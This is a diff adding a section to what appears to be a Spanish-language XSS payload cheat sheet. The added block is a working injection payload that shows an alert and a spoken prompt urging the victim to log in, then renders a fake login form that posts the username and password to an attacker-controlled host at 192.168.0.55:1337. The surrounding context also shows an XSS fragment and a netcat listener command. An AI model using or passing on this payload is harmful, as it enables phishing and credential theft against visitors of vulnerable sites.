@@ -229,6 +229,21 @@ new class extends class extends class extends class extends alert(1){}{}{}{}
 `ncat -lnvp puerto`
 
 
+## Fake login usando inyecciones xss, html y javascript
+
+```
+<script>alert(‘Favor de iniciar sesion para continuar’)</script>
+<h3>Para continuar navegado, inicie sesion</h3>
+<form action=http://192.168.0.55:1337>Username:<br>
+<input type=”username” name=”username”></br>Password:<br>
+<input type=”username” name=”password”></br><br>
+<input type=”submit” value=”Login”></br>
+<script type=”text/javascript”>function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI=”native”;b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang=”es-ES”;speechSynthesis.speak(b)}speak(“Favor de iniciar sesion para poder continuar navegando”);</script>
+
+```
+
+
+
 
 ## xss shell
 
